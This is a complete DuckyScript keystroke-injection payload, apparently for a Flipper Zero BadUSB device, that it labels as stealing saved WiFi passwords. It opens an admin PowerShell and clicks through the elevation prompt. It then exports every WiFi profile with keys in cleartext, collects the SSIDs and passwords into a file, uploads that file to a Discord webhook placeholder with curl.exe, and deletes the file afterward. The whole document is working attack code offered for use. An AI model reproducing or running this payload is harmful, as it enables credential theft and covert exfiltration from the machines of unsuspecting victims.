REM Author: NocX
REM Description: Steals saved WiFi SSID and passwords and sends them to a Discord webhook.
REM Version: 1.4
REM Creation Date: 22/09/2024
REM Update date: 18/01/2025
REM Category: Passwords
REM ------------------------------------
REM This script:
REM 1 Opens PowerShell (Admin)
REM 2 Collects WiFi data
REM 3 Send to discord via a webhook
REM 4 Closes everything
REM ------------------------------------

REM ---------- Open PowerShell as Admin ----------
DELAY 500
GUI r
DELAY 500
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 2000
LEFTARROW
ENTER
DELAY 500
REM ---------- Collects WiFi data and send to discord ----------
STRING $userDir = (Get-ChildItem env:\userprofile).value; $wifiPasswords = netsh wlan export profile key=clear folder=$userDir; $wifiFiles = Get-ChildItem "$userDir\*.xml"; $passwordsFile = "$userDir\WiFi_Passwords.txt"; Remove-Item -Path $passwordsFile -ErrorAction SilentlyContinue; foreach ($file in $wifiFiles) { $wifiData = Get-Content $file.FullName; $ssid = ($wifiData | Select-String '<name>(.*?)</name>').Matches.Groups[1].Value; $password = ($wifiData | Select-String '<keyMaterial>(.*?)</keyMaterial>').Matches.Groups[1].Value; if ($password) { Add-Content -Path $passwordsFile -Value "SSID: $ssid, Password: $password"; } } if (-not (Test-Path $passwordsFile) -or (Get-Content $passwordsFile).Length -eq 0) { Add-Content -Path $passwordsFile -Value "No WiFi passwords found."; } $webhookUrl = "YOUR_DISCORD_WEBHOOK_TOKEN"; $Body = @{ content = "$env:computername WiFi SSIDs and Passwords from Flipper Zero" }; Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F "file1=@$passwordsFile" $webhookUrl; Remove-Item $passwordsFile; exit
ENTER
